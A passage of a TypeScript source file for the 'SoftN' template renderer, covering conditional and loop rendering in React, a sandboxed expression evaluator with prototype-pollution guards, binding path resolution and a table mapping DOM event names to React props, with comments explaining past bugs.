  // Get a unique identifier for the condition value
  const conditionId = getConditionIdentifier(node.condition);

  // Get currentPage for making keys truly unique across navigation
  const currentPage = context.state['currentPage'] ?? 'unknown';

  // Get the source line number to make keys truly unique across different #if blocks
  const conditionLine = node.loc?.line ?? 0;

  if (condition) {
    // Build a unique key that identifies THIS specific branch
    // Include conditionLine to distinguish #if blocks at same position in different parents
    // Include currentPage to force remount when navigating
    const branchKey = `softn-if-${key ?? '0'}-L${conditionLine}-${conditionId}-${currentPage}${branchPath}`;

    // Render the children
    const children = renderNodes(node.consequent, context, registry, branchKey);

    // Use React.Fragment with key to avoid DOM pollution and ensure proper React reconciliation
    // The key forces React to unmount/remount when switching between branches
    return React.createElement(React.Fragment, { key: branchKey }, children);
  }

  if (node.alternate) {
    if (Array.isArray(node.alternate)) {
      // #else branch
      const branchKey = `softn-if-${key ?? '0'}-L${conditionLine}-else-${currentPage}${branchPath}`;
      const children = renderNodes(node.alternate, context, registry, branchKey);

      return React.createElement(React.Fragment, { key: branchKey }, children);
    } else {
      // Chained #elseif - extend the path to track which elseif branch we're in
      return renderIfBlock(node.alternate, context, registry, key, branchPath + '-elif');
    }
  }

  return null;
}

/**
 * Render an each block
 */
function renderEachBlock(
  node: EachBlock,
  context: SoftNRenderContext,
  registry: ComponentRegistry,
  key?: number | string
): React.ReactNode {
  const iterable = evaluateStructural(node.iterable, context, [], '#each iterable');

  if (!Array.isArray(iterable) || iterable.length === 0) {
    if (node.emptyFallback) {
      return React.createElement(
        React.Fragment,
        { key },
        renderNodes(node.emptyFallback, context, registry, `${key}-empty`)
      );
    }
    return null;
  }

  const renderedItems = iterable.map((item, index) => {
    // Create new context with iteration variables
    const iterContext: SoftNRenderContext = {
      ...context,
      state: {
        ...context.state,
        [node.itemName]: item,
        ...(node.indexName ? { [node.indexName]: index } : {}),
      },
      each: {
        item,
        index,
        key: node.keyExpression
          ? String(
              evaluateExpression(node.keyExpression, {
                ...context,
                state: {
                  ...context.state,
                  [node.itemName]: item,
                  // The index variable belongs in scope here too. Without it,
                  // `#each (row, i in rows) key={i}` evaluated `i` against a
                  // state that had never heard of it: every row got the key
                  // "undefined", React warned about duplicate children, and
                  // component state attached to whichever row happened to be
                  // matched — so editing one row's input moved the text to
                  // another when the list reordered.
                  ...(node.indexName ? { [node.indexName]: index } : {}),
                },
              })
            )
          : String(index),
      },
    };

    // Use the computed key from keyExpression if available, otherwise warn and use index
    const itemKey = iterContext.each?.key ?? String(index);

    // Warn in development if using index as key for items that might have state
    if (!node.keyExpression && isDevelopment && index === 0) {
      // Only warn once per each block (on first item)
      console.warn(
        `[SoftN] Each block without key expression detected. Consider adding a key for better performance: ` +
          `#each (${node.itemName}${node.indexName ? `, ${node.indexName}` : ''} in iterable) key={${node.itemName}.id}`
      );
    }

    const children = renderNodes(node.body, iterContext, registry, `${key}-item-${itemKey}`);

    return React.createElement(React.Fragment, { key: itemKey }, children);
  });

  return React.createElement(React.Fragment, { key }, renderedItems);
}

/**
 * Evaluate an expression in the given context
 * Includes recursion depth tracking to prevent infinite loops
 */
export function evaluateExpression(
  expr: Expression,
  context: SoftNRenderContext,
  depth: number = 0
): unknown {
  // Prevent infinite recursion
  if (depth > MAX_EVAL_DEPTH) {
    if (isDevelopment) {
      console.error(
        '[SoftN] Maximum expression evaluation depth exceeded. Possible circular reference.'
      );
    }
    return undefined;
  }

  const evalExpr = (e: Expression) => evaluateExpression(e, context, depth + 1);

  switch (expr.type) {
    case 'Identifier':
      // Look up in state, data, computed, props, functions, then JS globals
      if (expr.name in context.state) {
        return context.state[expr.name];
      }
      if (expr.name in context.data) {
        return context.data[expr.name];
      }
      if (expr.name in context.computed) {
        // A computed is stored as a thunk — `() => callComputed(name)` — because
        // its value has to be re-derived whenever the state it reads moves.
        // Returning the thunk handed the template the function instead of the
        // value, so `#each (todo in filteredTodos)` iterated a function and
        // rendered its source into the page:
        //   (...r)=>{let i={...t,state:{...t.state}};if(e.para
        const value = context.computed[expr.name];
        return typeof value === 'function' ? (value as () => unknown)() : value;
      }
      if (expr.name in context.props) {
        return context.props[expr.name];
      }
      if (expr.name in context.functions) {
        return context.functions[expr.name];
      }
      if (expr.name in JS_GLOBALS) {
        return JS_GLOBALS[expr.name];
      }
      // Identifier not found - return undefined (data may not be loaded yet)
      return undefined;

    case 'Literal':
      return expr.value;

    case 'BinaryExpression': {
      // Short-circuit operators must evaluate right side lazily
      if (expr.operator === '&&') {
        const left = evalExpr(expr.left);
        return left ? evalExpr(expr.right) : left;
      }
      if (expr.operator === '||') {
        const left = evalExpr(expr.left);
        return left ? left : evalExpr(expr.right);
      }
      if (expr.operator === '??') {
        const left = evalExpr(expr.left);
        return left != null ? left : evalExpr(expr.right);
      }

      const left = evalExpr(expr.left);
      const right = evalExpr(expr.right);

      switch (expr.operator) {
        case '+':
          if (typeof left === 'string' || typeof right === 'string') {
            return String(left ?? '') + String(right ?? '');
          }
          return (left as number) + (right as number);
        case '-':
          return (left as number) - (right as number);
        case '*':
          return (left as number) * (right as number);
        case '/':
          return (left as number) / (right as number);
        case '%':
          return (left as number) % (right as number);
        case '==':
          return left == right;
        case '!=':
          return left != right;
        case '===':
          return left === right;
        case '!==':
          return left !== right;
        case '<':
          return (left as number) < (right as number);
        case '>':
          return (left as number) > (right as number);
        case '<=':
          return (left as number) <= (right as number);
        case '>=':
          return (left as number) >= (right as number);
        case 'instanceof':
          return typeof right === 'function'
            ? left instanceof (right as new (...args: unknown[]) => unknown)
            : false;
        default:
          return undefined;
      }
    }

    case 'UnaryExpression': {
      const arg = evalExpr(expr.argument);

      switch (expr.operator) {
        case '!':
          return !arg;
        case '-':
          return -(arg as number);
        case '+':
          return +(arg as number);
        case 'typeof':
          return typeof arg;
        case 'void':
          return void arg;
        default:
          return undefined;
      }
    }

    case 'MemberExpression': {
      const obj = evalExpr(expr.object);

      // Handle optional chaining - return undefined if object is null/undefined
      // This gracefully handles cases like {selectedItem.name} when selectedItem is null
      if (obj == null) {
        return undefined;
      }

      // Handle primitive types that can have methods (string, number)
      const target = obj as Record<string, unknown>;

      if (expr.computed) {
        const prop = evalExpr(expr.property);
        const safeKey = getSafeMemberKey(prop);
        if (safeKey === null) return undefined;
        return target[safeKey];
      } else if (expr.property.type === 'Identifier') {
        const safeKey = getSafeMemberKey(expr.property.name);
        if (safeKey === null) return undefined;
        return target[safeKey];
      }

      return undefined;
    }

    case 'CallExpression': {
      // For method calls (e.g., arr.filter(...)), preserve `this` binding
      let fn: unknown;
      let thisObj: unknown = undefined;

      if (expr.callee.type === 'MemberExpression') {
        thisObj = evalExpr(expr.callee.object);
        if (thisObj != null) {
          const target = thisObj as Record<string, unknown>;
          if (expr.callee.computed) {
            const prop = evalExpr(expr.callee.property);
            const safeKey = getSafeMemberKey(prop);
            if (safeKey === null) {
              fn = undefined;
            } else {
              fn = target[safeKey];
            }
          } else if (expr.callee.property.type === 'Identifier') {
            const safeKey = getSafeMemberKey(expr.callee.property.name);
            if (safeKey === null) {
              fn = undefined;
            } else {
              fn = target[safeKey];
            }
          }
        }
      } else {
        fn = evalExpr(expr.callee);
      }

      // Handle optional chaining - return undefined if function is null/undefined
      if (fn == null) {
        if (expr.optional) {
          return undefined;
        }
        // Only warn if the script has finished loading. Before loadScript() completes,
        // functions are not yet available — this is normal and not worth warning about.
        if (context.scriptLoaded) {
          const funcName =
            expr.callee.type === 'Identifier'
              ? expr.callee.name
              : expr.callee.type === 'MemberExpression' && expr.callee.property.type === 'Identifier'
                ? expr.callee.property.name
                : 'unknown';
          console.warn(
            `[SoftN] Function "${funcName}" not found. Callee evaluated to ${fn === null ? 'null' : 'undefined'}`
          );
        }
        return undefined;
      }

      const args = expr.arguments.map((arg) => evalExpr(arg));

      if (typeof fn === 'function') {
        if (fn === Function) {
          return undefined;
        }
        // Bind `this` for method calls (arr.filter, str.toUpperCase, etc.)
        return thisObj != null ? fn.apply(thisObj, args) : fn(...args);
      }

      return undefined;
    }

    case 'ConditionalExpression': {
      const test = evalExpr(expr.test);
      return test ? evalExpr(expr.consequent) : evalExpr(expr.alternate);
    }

    case 'ArrowFunctionExpression': {
      return (...args: unknown[]) => {
        const fnContext: SoftNRenderContext = {
          ...context,
          state: { ...context.state },
        };

        // Bind parameters
        expr.params.forEach((param, i) => {
          fnContext.state[param] = args[i];
        });

        if (typeof expr.body === 'string') {
          // A block body is not executed here — running arbitrary statements is
          // the script VM's job, not the renderer's.
          //
          // What matters is that it used to fail in complete silence. The
          // diagnostic sat inside a `startsWith('return ')` branch, so the one
          // shape that says nothing at all — `@click={() => { save() }}` — got
          // no warning, returned undefined, and left a control that looks
          // ordinary and does nothing when pressed. Nothing in the console,
          // nothing on screen. Every block body reports itself now, and says
          // what to write instead.
          const bodyStr = expr.body.trim();
          const suggestion = bodyStr.startsWith('return ')
            ? bodyStr.slice('return '.length).replace(/;$/, '')
            : bodyStr.replace(/;$/, '');
          console.error(
            `[SoftN] This handler did not run: an arrow function with a { } body is not ` +
              `evaluated in a template. Write it without the braces — ` +
              `{() => ${suggestion || '…'}} — or move it into a <logic> function and ` +
              `reference that.`
          );
          return undefined;
        }

        return evaluateExpression(expr.body, fnContext, depth + 1);
      };
    }

    case 'ObjectExpression': {
      const obj: Record<string, unknown> = {};
      for (const prop of expr.properties) {
        // Prevent prototype pollution from user expressions
        if (prop.key === '__proto__' || prop.key === 'constructor' || prop.key === 'prototype') continue;
        obj[prop.key] = evalExpr(prop.value);
      }
      return obj;
    }

    case 'ArrayExpression': {
      const result: unknown[] = [];
      for (const el of expr.elements) {
        if (el.type === 'SpreadElement') {
          const spread = evalExpr(el.argument);
          if (Array.isArray(spread)) {
            result.push(...spread);
          } else {
            result.push(spread);
          }
        } else {
          result.push(evalExpr(el));
        }
      }
      return result;
    }

    case 'SpreadElement': {
      // Spread elements should be handled in their parent context (object/array)
      const value = evalExpr(expr.argument);
      return value;
    }

    case 'TemplateLiteral': {
      // Template literal: combine quasis and expressions
      let result = '';
      const quasis = expr.quasis || [];
      const expressions = expr.expressions || [];

      for (let i = 0; i < quasis.length; i++) {
        const q = quasis[i];
        // quasis[i] may be a TemplateElement object or a plain string
        result += typeof q === 'string' ? q : (q?.value?.cooked ?? q?.value?.raw ?? String(q ?? ''));
        if (i < expressions.length) {
          result += String(evalExpr(expressions[i]) ?? '');
        }
      }
      return result;
    }

    default:
      return undefined;
  }
}

/**
 * Get the path string from an expression (for state updates)
 * Supports complex paths including computed properties and optional chaining
 */
function getExpressionPath(expr: Expression, context?: SoftNRenderContext): string | null {
  if (expr.type === 'Identifier') {
    return expr.name;
  }

  if (expr.type === 'MemberExpression') {
    const objectPath = getExpressionPath(expr.object, context);
    if (!objectPath) return null;

    if (!expr.computed && expr.property.type === 'Identifier') {
      return `${objectPath}.${expr.property.name}`;
    }

    // Handle computed properties like items[0] or items[index]
    if (expr.computed) {
      if (expr.property.type === 'Literal') {
        const key = expr.property.value;
        if (typeof key === 'number') {
          return `${objectPath}[${key}]`;
        }
        if (typeof key === 'string') {
          return `${objectPath}["${key}"]`;
        }
      }
      if (expr.property.type === 'Identifier') {
        // Resolve the index, do not name it.
        //
        // This returned `todos[i]` — the identifier's spelling — so a :bind
        // inside `#each (todo, i in todos)` wrote every row's edit to a literal
        // key called "i". The real row was never touched and a junk entry
        // appeared beside the list, so typing in the second row changed nothing
        // visible and quietly corrupted the data behind it.
        if (context) {
          const index = evaluateExpression(expr.property, context);
          if (typeof index === 'number' || typeof index === 'string') {
            return typeof index === 'number'
              ? `${objectPath}[${index}]`
              : `${objectPath}["${index}"]`;
          }
        }
        // Without a context there is nothing to resolve against; the caller
        // gets the old placeholder rather than a silently wrong path.
        return `${objectPath}[${expr.property.name}]`;
      }
    }
  }

  return null;
}

/**
 * Capitalize first letter
 */
function capitalize(str: string): string {
  return str.charAt(0).toUpperCase() + str.slice(1);
}

/**
 * DOM event names whose React prop is not `on` + the capitalised name.
 *
 * `@click` works because React calls it `onClick`. `@keydown` does not, because
 * React calls it `onKeyDown` and no rule turns one into the other — `dblclick`
 * becomes `onDoubleClick`, which no amount of casing gets you to. React silently
 * ignores a prop it does not recognise, so the handler was simply never wired
 * up: the control looked normal and did nothing, while `@click` on the same
 * element worked, which reads as a broken handler rather than a broken name.
 *
 * It is reachable from the tools in this repo. The visual builder's event picker
 * offers 'keydown' and 'keyup' (apps/softn-builder PropertyPanel), and the demo
 * bundle in @softn/core uses `@keydown` on its edit field and `@dblclick` to
 * open the editor, so in that bundle neither did anything.
 *
 * Only irregular names are listed. Anything absent keeps the old behaviour,
 * which is what a COMPONENT callback needs: `@press` must stay `onPress`, and a
 * custom `@clearCompleted` must stay `onClearCompleted`. The lookup is on the
 * name exactly as authored, so `@keyDown` written in camelCase already resolved
 * correctly and still does.
 */
const REACT_EVENT_PROPS: Readonly<Record<string, string>> = {
  keydown: 'onKeyDown',
  keyup: 'onKeyUp',
  keypress: 'onKeyPress',
  dblclick: 'onDoubleClick',
  doubleclick: 'onDoubleClick',
  mousedown: 'onMouseDown',
  mouseup: 'onMouseUp',
  mouseenter: 'onMouseEnter',
  mouseleave: 'onMouseLeave',
  mousemove: 'onMouseMove',
  mouseover: 'onMouseOver',
  mouseout: 'onMouseOut',
  contextmenu: 'onContextMenu',
  pointerdown: 'onPointerDown',
  pointerup: 'onPointerUp',
  pointermove: 'onPointerMove',
  pointerenter: 'onPointerEnter',
  pointerleave: 'onPointerLeave',
  pointerover: 'onPointerOver',
  pointerout: 'onPointerOut',
  pointercancel: 'onPointerCancel',
  touchstart: 'onTouchStart',
  touchend: 'onTouchEnd',
  touchmove: 'onTouchMove',
  touchcancel: 'onTouchCancel',
  dragstart: 'onDragStart',
  dragend: 'onDragEnd',
  dragenter: 'onDragEnter',
  dragleave: 'onDragLeave',
  dragover: 'onDragOver',
  animationstart: 'onAnimationStart',
  animationend: 'onAnimationEnd',
  animationiteration: 'onAnimationIteration',
  transitionend: 'onTransitionEnd',
  compositionstart: 'onCompositionStart',
  compositionend: 'onCompositionEnd',
  compositionupdate: 'onCompositionUpdate',
  timeupdate: 'onTimeUpdate',
  volumechange: 'onVolumeChange',
  ratechange: 'onRateChange',
  durationchange: 'onDurationChange',
  loadeddata: 'onLoadedData',
  loadedmetadata: 'onLoadedMetadata',
  loadstart: 'onLoadStart',
  canplay: 'onCanPlay',
  canplaythrough: 'onCanPlayThrough',
  contextlost: 'onContextLost',
  contextrestored: 'onContextRestored',
};

/** The React prop name for an authored `@event`. */
export function reactEventProp(name: string): string {
  return REACT_EVENT_PROPS[name] ?? `on${capitalize(name)}`;
}
